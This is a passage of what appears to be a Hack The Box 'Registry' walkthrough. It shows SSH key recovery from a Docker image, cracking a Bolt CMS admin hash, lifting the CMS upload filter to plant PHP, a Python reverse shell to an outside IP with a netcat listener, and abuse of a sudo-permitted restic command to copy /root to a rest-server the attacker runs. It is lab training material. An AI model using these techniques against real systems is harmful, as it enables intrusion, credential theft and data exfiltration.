+<p>Looks all good now! We pulled the image and it can be ran locally. We can now start it and get a shell inside, so we can recon for interesting files:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ docker run -it 601499e98a60 /bin/bash</span><br><span class="line"></span><br><span class="line">root@6467ad831f74:/<span class="comment"># cd /root</span></span><br><span class="line">root@6467ad831f74:~<span class="comment"># ls -la</span></span><br><span class="line">total 28</span><br><span class="line">drwx------ 1 root root 4096 Jan 27 13:14 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Jan 27 13:08 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 May 25  2019 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc</span><br><span class="line">-rw-r--r-- 1 root root  148 May 25  2019 .profile</span><br><span class="line">drwxr-xr-x 2 root root 4096 May 25  2019 .ssh</span><br><span class="line">-rw------- 1 root root 1061 May 25  2019 .viminfo</span><br><span class="line">-rw-r--r-- 1 root root  215 Jan 27 13:14 .wget-hsts</span><br><span class="line">root@19e33fc3a2fa:~<span class="comment"># ls -a .ssh/</span></span><br><span class="line">.  ..  config  id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">root@19e33fc3a2fa:~<span class="comment"># cat .ssh/config</span></span><br><span class="line">Host registry</span><br><span class="line">  User bolt</span><br><span class="line">  Port 22</span><br><span class="line">  Hostname registry.htb</span><br><span class="line">root@19e33fc3a2fa:~<span class="comment"># cat .ssh/id_rsa</span></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9</span><br><span class="line"></span><br><span class="line">KF9YHXRjDZ35Q9ybzkhcUNKF8DSZ+aNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7w</span><br><span class="line">[...]</span><br><span class="line">94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>We have an<code>.ssh/</code> folder with private key and a username  <code>bolt</code> for <code>registry.htb</code> host. Looks a little too easy but let’s give a try:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa bolt@registry.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>:</span><br></pre></td></tr></table></figure>
+
+<p>Of course it was too easy, the key need a passphrase and we didn’t find any yet… In these situations I usually try to run <code>john</code> to quickly brute-force the passphrase:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh2john id_rsa &gt; id_rsa.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">0g 0:00:00:18 DONE (2020-01-31 15:29) 0g/s 792796p/s 792796c/s 792796C/s </span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+
+<p>No luck here. To be honest it took me too much time to find this passphrase but, as usual, recon is always the key to progress and finally:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@02c3e9ee87d2:/<span class="comment"># grep -ri "passphrase" 2&gt;/dev/null</span></span><br><span class="line">[...]</span><br><span class="line">etc/profile.d/01-ssh.sh:expect <span class="string">"Enter passphrase for /root/.ssh/id_rsa:"</span></span><br><span class="line">root@02c3e9ee87d2:/<span class="comment"># cat etc/profile.d/01-ssh.sh</span></span><br><span class="line"><span class="comment">#!/usr/bin/expect -f</span></span><br><span class="line"><span class="comment">#eval `ssh-agent -s`</span></span><br><span class="line">spawn ssh-add /root/.ssh/id_rsa</span><br><span class="line">expect <span class="string">"Enter passphrase for /root/.ssh/id_rsa:"</span></span><br><span class="line">send <span class="string">"GkOcz221Ftb3ugog\n"</span>;</span><br><span class="line">expect <span class="string">"Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"</span></span><br><span class="line">interact</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ssh-add is a command for adding SSH private keys into the SSH authentication agent for implementing single sign-on with SSH. </p>
+</blockquote>
+<p>As a reminder:</p>
+<blockquote>
+<p> /etc/profile<br>            The systemwide initialization file, executed for login shells</p>
+</blockquote>
+<p>When looking in the <code>/etc/profile</code> we can see that all scripts in <code>/etc/profile.d/</code> are executed on login time:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@02c3e9ee87d2:/<span class="comment"># cat /etc/profile</span></span><br><span class="line">[...]</span><br><span class="line"><span class="keyword">if</span> [ -d /etc/profile.d ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> /etc/profile.d/*.sh; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ -r <span class="variable">$i</span> ]; <span class="keyword">then</span></span><br><span class="line">      . <span class="variable">$i</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  <span class="built_in">unset</span> i</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<p>We now understand why this <code>ssh-add</code> command is made on login, the combination of <code>ssh-agent</code> and <code>ssh-add</code> allow the user to connect to any server he is allowed to access without having to type in a password every time when moving between servers. </p>
+<p>Well now that we have all the needed informations, let’s try to login to SSH again:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa bolt@registry.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'./id_rsa'</span>:</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Mon Jan 27 14:42:39 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.02              Users logged <span class="keyword">in</span>:                0</span><br><span class="line">  Usage of /:   5.6% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 21%               IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Processes:    154</span><br><span class="line">Last login: Mon Oct 21 10:31:48 2019 from 10.10.14.2</span><br><span class="line">bolt@bolt:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">bolt@bolt:~$ cat user.txt</span><br><span class="line">yxxxxxxxxxxxxxxxxxxxxxxxxxi</span><br></pre></td></tr></table></figure>
+
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>Alright! Now that we have access to <code>bolt</code> account. It’s time to escalate it to root.</p>
+<h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The usual quick  recon shows that <code>bolt</code> user doesn’t seems to hold anything very valuable. Let’s investigate the <code>/var/www/html/</code> directory to take a look at this <code>backup.php</code> file we found during the user recon phase:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ cat /var/www/backup.php</span><br><span class="line">&lt;?php shell_exec(<span class="string">"sudo restic backup -r rest:http://backup.registry.htb/bolt bolt"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Alright so this php file is calling an external command to make backup it seems. The interesting point here is that the command is launched as root using <code>sudo</code>. That mean if we can find a flaw in the command we can very probably elevate our privileges to root.</p>
+<p>Unfortunately as <code>bolt</code> user we can not run this command without inputting password. Seeing the <code>backup.php</code> file we can guess with good confidence that <code>sudo</code> have been configured to allow the Apache user (<code>www-data</code>) to run the <code>sudo</code> backup command without inputing password. This way the <code>backup.php</code> script can be run automatically through cronjob for example.</p>
+<p>So now we need to find a way to pivot to <code>www-data</code> user to exploit this backup script. Let’s investigate.</p>
+<h3 id="Pivot-bolt-gt-www-data"><a href="#Pivot-bolt-gt-www-data" class="headerlink" title="Pivot bolt -&gt; www-data"></a>Pivot bolt -&gt; www-data</h3><p>While looking in the <code>/var/www/html/</code> directory we find a <code>bolt/</code> folder. This one was missed by <code>gobuster</code> during our recon phase.</p>
+<p>So what’s this bolt?<br>Opening <code>https://registry.htb/bolt</code> display an empty sample website:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/75478718-ba171080-599e-11ea-8a71-450c96466f93.png" alt="bolt sample website"></p>
+<p>A quick Google search gives us additional information about what Bolt is: </p>
+<blockquote>
+<p>Bolt is a free, open-source content management system based on PHP. It was released in 2012 and developed by Two Kings and the Bolt community. Bolt uses Twig for templates and includes features for content and user management.<br><a href="https://bolt.cm/" target="_blank" rel="noopener">Bolt.cm</a></p>
+</blockquote>
+<p>I will add it to my usual recon list to make sure not missing it next time:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> bolt &gt;&gt; ~/SecLists/Discovery/Web-Content/big.txt</span><br></pre></td></tr></table></figure>
+
+<p>Reading through the documentation we can see that the admin interface is available at <a href="https://registry.htb/bolt/bolt" target="_blank" rel="noopener">https://registry.htb/bolt/bolt</a> :</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/75478994-2134c500-599f-11ea-8b40-09e1489b3d57.png" alt="bolt admin page"></p>
+<p>No common password combination seems to work here. No need to loose time brute-forcing, since we have access the app code source through the <code>bolt</code> ssh user account let’s dig a bit there to see if we can find any interesting config files.</p>
+<p>Looking around we quickly stumble across <code>bolt</code> sqli database in <code>/var/www/html/bolt/database/bolt.db</code>.</p>
+<p>Let’s take a look inside for juicy information:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlite3 bolt.db</span><br><span class="line">SQLite version 3.30.1 2019-10-10 20:19:45</span><br><span class="line">Enter <span class="string">".help"</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">bolt_authtoken    bolt_field_value  bolt_pages        bolt_users</span><br><span class="line">bolt_blocks       bolt_homepage     bolt_relations</span><br><span class="line">bolt_cron         bolt_log_change   bolt_showcases</span><br><span class="line">bolt_entries      bolt_log_system   bolt_taxonomy</span><br><span class="line">sqlite&gt; SELECT * FROM bolt_users;</span><br><span class="line">1|admin|<span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$e</span>.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|[<span class="string">"files://shell.php"</span>]|1||||0||[<span class="string">"root"</span>,<span class="string">"everyone"</span>]</span><br><span class="line">sqlite&gt;</span><br></pre></td></tr></table></figure>
+
+<p>The first thing that catch the attention is this <code>bolt_users</code> table. Inside we grab the password hash of user <code>Admin</code>.  </p>
+<p>Let’s try to crack it using <code>john</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt admin.hash</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">"bcrypt"</span>, but the string is also recognized as <span class="string">"bcrypt-opencl"</span></span><br><span class="line">Use the <span class="string">"--format=bcrypt-opencl"</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 1024 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">strawberry       (?)</span><br><span class="line">1g 0:00:00:09 DONE (2020-01-27 16:03) 0.1072g/s 36.69p/s 36.69c/s 36.69C/s strawberry..ihateyou</span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+
+<p>Bingo! So, we got <code>Admin:strawberry</code>, using those credentials in the admin login page works.   </p>
+<p><img src="https://user-images.githubusercontent.com/9076747/75479875-8e952580-59a0-11ea-9bb0-54ca89137950.png" alt="bolt admin dashboard"></p>
+<p>Looking around at the various settings we quickly come across the “File Management” setting, allowing us to upload file to the server. Sounds good to upload a web shell don’t you think? </p>
+<p>First thing to try is to send a <code>.php</code> file to see if we can execute php on the server:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;?php phpinfo();"</span> &gt; test.php</span><br></pre></td></tr></table></figure>
+
+<p>Unfortunately when trying to upload we receive the following error message:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/75480049-e2077380-59a0-11ea-9eec-d5a3d1555d77.png" alt="bolt upload failure"></p>
+<p>No php allowed. At this point I tried various way to bypass the file upload restrictions:</p>
+<ul>
+<li>Changing extension (<code>test.PHp</code>, <code>test.php7</code> since server runs PHP7)</li>
+<li>Content-type bypass</li>
+<li>Double extension (<code>test.php.jpg</code>, <code>test.jpg.php</code>)</li>
+<li>Null Character (<code>test.php%00.jpg</code>)</li>
+<li>Using GIF89a; header</li>
+</ul>
+<p>But didn’t managed to get any of this to work. Searching a bit farther we discover that it’s possible to change the allowed extension list in “Configuration/Main Configuration”. Even though a comment state <code>.php</code> extension are “never acceptable”, adding it to the list seems to work and let us upload php file:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Note that certain file-types are never acceptable, even if they are in this list. </span></span><br><span class="line"><span class="comment"># These types are never allowed: sh, asp, cgi, php, php3, ph3, php4, ph4, php5, ph5, </span></span><br><span class="line"><span class="comment"># phtm, phtml</span></span><br><span class="line"><span class="attr">accept_file_types:</span> <span class="string">[</span> <span class="string">php,</span> <span class="string">twig,</span> <span class="string">html,</span> <span class="string">js,</span> <span class="string">css,</span> <span class="string">scss,</span> <span class="string">gif,</span> <span class="string">jpg,</span> <span class="string">jpeg,</span> <span class="string">png,</span> <span class="string">ico,</span> <span class="string">zip,</span> <span class="string">tgz,</span> <span class="string">txt,</span> <span class="string">md,</span> <span class="string">doc,</span> <span class="string">docx,</span> <span class="string">pdf,</span> <span class="string">epub,</span> <span class="string">xls,</span> <span class="string">xlsx,</span> <span class="string">ppt,</span> <span class="string">pptx,</span> <span class="string">mp3,</span> <span class="string">ogg,</span> <span class="string">wav,</span> <span class="string">m4a,</span> <span class="string">mp4,</span> <span class="string">m4v,</span> <span class="string">ogv,</span> <span class="string">wmv,</span> <span class="string">avi,</span> <span class="string">webm,</span> <span class="string">svg]</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://user-images.githubusercontent.com/9076747/75481560-8c809600-59a3-11ea-8b0a-7a2c2c7f88ec.png" alt="bolt php file upload"></p>
+<p>The php file is now accessible at <code>https://registry.htb/bolt/files/hg8.php</code>:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/75481639-aae69180-59a3-11ea-8154-75163f358616.png" alt="bolt php file upload"></p>
+<p>Good, we are on the right track to upload a web shell. Unfortunately it’s not that simple, the uploaded files gets deleted and configuration file reset every 1 minute or so, making it impossible to use a web shell. The good news is we do have an access to the server on ssh as <code>bolt</code> user, here is how we can proceed to get a stable shell:</p>
+<ol>
+<li>Create a reverse shell script with the <code>bolt</code> account on the server <code>/tmp</code> folder.</li>
+<li>Upload a <code>.php</code> file executing this script.</li>
+</ol>
+<p>This way we get a reverse that will be executed as <code>www-data</code> and will stay up even after the <code>.php</code> file gets deleted. Here is one way to do so:</p>
+<p>First let’s create the reverse shell script. I will use Python one:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ cat /tmp/hg8.py</span><br><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line">bolt@bolt:/$ <span class="built_in">which</span> python</span><br><span class="line">/usr/bin/python</span><br></pre></td></tr></table></figure>
+
+<p>Now our php file calling this <code>hg8.py</code> reverse shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">'&lt;?php shell_exec("/usr/bin/python /tmp/hg8.py"); ?&gt;'</span> &gt; hg8.php</span><br></pre></td></tr></table></figure>
+
+<p>Finally let’s open our listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>And let’s redo the process, edit the configuration to allow <code>.php</code> upload, upload the <code>hg8.php</code> file and open it!</p>
+<p>If everything goes fine and you have been fast enough the connection will open. But it doesn’t… The connection just seem to hang.</p>
+<p>The first thing that comes to mind is that a firewall is blocking any connection from outside. Since we have an access on the machine let’s try to open our listener here instead:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ nc -l -vv -p 8585</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8585)</span><br></pre></td></tr></table></figure>
+
+<p>Let’s now recreate our python reverse shell with <code>registry</code> IP, reupload and run our <code>hg8.php</code> and….</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ nc -l -vv -p 8585</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8585)</span><br><span class="line">Connection from localhost 48396 received!</span><br><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p>Alright, we now have access to <code>www-data</code> account. That’s a good progress. Let’s now try to find if and how we could escalate to root privilege. </p>
+<p>While doing the usual recon for privilege escalation, we stumble across the backup command we have seem before:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on bolt:</span><br><span class="line">    env_reset, exempt_group=sudo, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on bolt:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/restic backup -r rest*</span><br></pre></td></tr></table></figure>
+
+<p>It’s the <code>restic</code> command we saw in the <code>/var/www/html/backup.php</code> file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/var/www/html$ cat /var/www/html/backup.php</span><br><span class="line">&lt;?php shell_exec(<span class="string">"sudo restic backup -r rest:http://backup.registry.htb/bolt bolt"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Let’s check for the documentation of <code>restic</code> to understand better how it works. According to its website:</p>
+<blockquote>
+<p>restic is a backup program that is fast, efficient and secure. It supports the three major operating systems<br><a href="https://restic.net/" target="_blank" rel="noopener">https://restic.net/</a></p>
+</blockquote>
+<p>So we have a program that can be run as <code>root</code> manipulating files we can control. Sounds like a perfect scenario for privilege escalation ;)</p>
+<p>Let’s break down the <code>restic</code> command from <code>backup.php</code> to understand exactly what’s it’s doing :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ restic --<span class="built_in">help</span></span><br><span class="line">[...]</span><br><span class="line">  backup        Create a new backup of files and/or directories</span><br><span class="line">bolt@bolt:/$ restic backup --<span class="built_in">help</span></span><br><span class="line">[...]</span><br><span class="line">  -r, --repo string              repository to backup to or restore from (default: <span class="variable">$RESTIC_REPOSITORY</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Alright so if we take this command as example:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">restic backup -r rest:http://backup.registry.htb/bolt bolt</span><br></pre></td></tr></table></figure>
+
+<p><code>restic</code> is going to back up the <code>bolt</code> folder to the distant repository available at <code>http://backup.registry.htb</code>.</p>
+<p>Looking around it seems we can not access nor do anything at <code>http://backup.registry.htb</code>. But anyway what lays there ? According to the <code>restic</code> documentation it’s the url of a <code>restic</code> remote repository. Reading a bit more we can find a tool (<a href="https://github.com/restic/rest-server" target="_blank" rel="noopener"><code>restic-rest-server</code></a>) to create those remote repositories:</p>
+<blockquote>
+<p>Rest Server is a high performance HTTP server that implements restic’s REST backend API. It provides secure and efficient way to backup data remotely, using restic backup client via the rest: URL.<br><a href="https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server" target="_blank" rel="noopener">https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server</a></p>
+</blockquote>
+<p>Seeing this we can understand it’s what is being used on <code>http://backup.registry.htb</code>.  </p>
+<p>With all those information in mind we start to understand how we could read files with escalated privileges:</p>
+<ol>
+<li>Setup a local <code>restic</code> backup server</li>
+<li>Use the following command that <code>www-data</code> can run as <code>sudo</code> without password: </li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/restic backup -r rest:http://our-restic-repo.local /root/</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>Navigate to the <code>/root/</code> folder that <code>restic</code> backup to grab the flag.</li>
+</ol>
+<p>It’s not yet a root shell but it should be good enough to grab the <code>root.txt</code> flag.</p>
+<p>Alright so that was the idea, let’s see in practice now!</p>
+<h3 id="Restic-privileged-file-read"><a href="#Restic-privileged-file-read" class="headerlink" title="Restic privileged file read"></a>Restic privileged file read</h3><p>First thing first let’s build the restic <code>rest-server</code> binary:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">clone</span> https://github.com/restic/rest-server.git &amp;&amp; <span class="built_in">cd</span> rest-server</span><br><span class="line">[hg8@archbook ~]$ go run build.go</span><br></pre></td></tr></table></figure>
+
+<p>Let’s now push the binary to the server:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp -i id_rsa rest-server bolt@registry.htb:/tmp/</span><br></pre></td></tr></table></figure>
+
+<p>We can now check the documentation to understand how to run it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/tmp/$ ./rest-server --<span class="built_in">help</span></span><br><span class="line">Run a REST server <span class="keyword">for</span> use with restic</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  rest-server [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --append-only         <span class="built_in">enable</span> append only mode</span><br><span class="line">      --cpu-profile string  write CPU profile to file</span><br><span class="line">      --debug               output debug messages</span><br><span class="line">  -h, --<span class="built_in">help</span>                <span class="built_in">help</span> <span class="keyword">for</span> rest-server</span><br><span class="line">      --listen string       listen address (default <span class="string">":8000"</span>)</span><br><span class="line">      --<span class="built_in">log</span> string          <span class="built_in">log</span> HTTP requests <span class="keyword">in</span> the combined <span class="built_in">log</span> format</span><br><span class="line">      --no-auth             <span class="built_in">disable</span> .htpasswd authentication</span><br><span class="line">      --path string         data directory (default <span class="string">"/tmp/restic"</span>)</span><br><span class="line">      --private-repos       users can only access their private repo</span><br><span class="line">      --prometheus          <span class="built_in">enable</span> Prometheus metrics</span><br><span class="line">      --tls                 turn on TLS support</span><br><span class="line">      --tls-cert string     TLS certificate path</span><br><span class="line">      --tls-key string      TLS key path</span><br><span class="line">  -V, --version             show version and quit</span><br></pre></td></tr></table></figure>
+
+<p>We have all the needed informations so let’s give a try here. First, still according to the documentation, we need to setup the repository folder :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ restic init --repo /tmp/hg8-backup</span><br><span class="line">enter password <span class="keyword">for</span> new repository:</span><br><span class="line">enter password again:</span><br><span class="line">created restic repository 14de0bc276 at /tmp/hg8-backup</span><br><span class="line"></span><br><span class="line">Please note that knowledge of your password is required to access</span><br><span class="line">the repository. Losing your password means that your data is</span><br><span class="line">irrecoverably lost.</span><br></pre></td></tr></table></figure>
+
+<p>Now we can start the <code>rest-server</code> with this backup path:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/tmp/$ ./rest-server --path ./hg8-backup --no-auth</span><br><span class="line">Data directory: ./registrybackup</span><br><span class="line">Authentication disabled</span><br><span class="line">Private repositories disabled</span><br><span class="line">Starting server on :8000</span><br></pre></td></tr></table></figure>
+
